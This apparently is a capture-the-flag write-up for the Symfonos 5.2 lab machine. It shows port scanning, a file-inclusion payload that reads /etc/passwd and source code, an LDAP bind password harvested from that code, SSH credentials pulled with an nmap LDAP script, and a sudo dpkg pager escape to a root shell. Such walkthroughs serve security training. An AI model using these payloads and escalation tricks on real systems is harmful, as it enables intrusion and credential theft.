root@kali ~/D/C/SYMFONOS#5.2# nmap -sS -A -T4 -p- 10.0.0.15

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?

After scanning the machine we find 3 services; ssh, http and ldap (A means of serving data on users, network devices and systems over the network. It stores usernames, passwords and other core user information. LDAP is vulnerable to a code injection).

---------------------------------------------------------------------------------------------------------------
HTTP
---------------------------------------------------------------------------------------------------------------
root@kali ~/D/C/SYMFONOS#5.2# dirsearch -u http://10.0.0.21/

[16:36:16] 200 -    2KB - /admin.php                                        
[16:36:26] 302 -    0B  - /home.php  ->  admin.php

After brute forcing the directories 2 results were most intersting, admin.php and home.php, if we go to http://10.0.0.15/admin.php we have a login page. home.php redirects us to admin.php.

Using burp suite we can see the the response of home.php, it holds this line --->

href="home.php?url=http://127.0.0.1/portraits.php"

Seems like we can use Remote File Inclusion. Trying to pass ?url=/etc/passwd we get the output of the passwd file:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

Now that we know we can read files, let's try to read the admin.php file.

$bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");

"qMDdyZh3cT6eeAWD" seems like a password.

---------------------------------------------------------------------------------------------------------------
LDAP 
---------------------------------------------------------------------------------------------------------------
We can use NSE to enumerate LDAP and get a username for our password.

nmap 10.0.0.15 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'

We found the creds:
zeus:cetkKf4wCuHC9FET

We can now log in to ssh.

---------------------------------------------------------------------------------------------------------------
SSH
---------------------------------------------------------------------------------------------------------------
zeus@symfonos5:~$ sudo -l
(root) NOPASSWD: /usr/bin/dpkg

The user "zeus" can run dpkg (A package manager like "apt") with sudo. I read the manual page of dpkg and saw this option:

"-l|--list [<pattern>...]         List packages concisely."

By running dpkg with -l we can list all the installed will be able to scroll up and down, like using the man command, and just like the man command we can run commands.
This means if we run dpkg -l with sudo we can run commands as root.

zeus@symfonos5:~$  sudo dpkg -l
!/bin/bash
root@symfonos5:/home/zeus# cat /root/proof.txt
 
                    Congrats on rooting symfonos:5!
  
                                   ZEUS
              *      .            dZZZZZ,       .          *
                                 dZZZZ  ZZ,
     *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
                    ,ZZZZZZV'      ZZZZ   `Z,`\
                  ,ZZZ    ZZ   .    ZZZZ   `V
        *      ZZZZV'     ZZ         ZZZZ    \_              .
.              V   l   .   ZZ        ZZZZZZ          .
               l    \       ZZ,     ZZZ  ZZZZZZ,
   .          /            ZZ l    ZZZ    ZZZ `Z,
                          ZZ  l   ZZZ     Z Z, `Z,            *
                .        ZZ      ZZZ      Z  Z, `l
                         Z        ZZ      V  `Z   \
                         V        ZZC     l   V
           Z             l        V ZR        l      .
            \             \       l  ZA
                            \         C          C
                                  \   K   /    /             K
                          A    \   \  |  /  /              /
                           \        \\|/ /  /
   __________________________________\|/_________________________
            Contact me via Twitter @zayotic to give feedback!

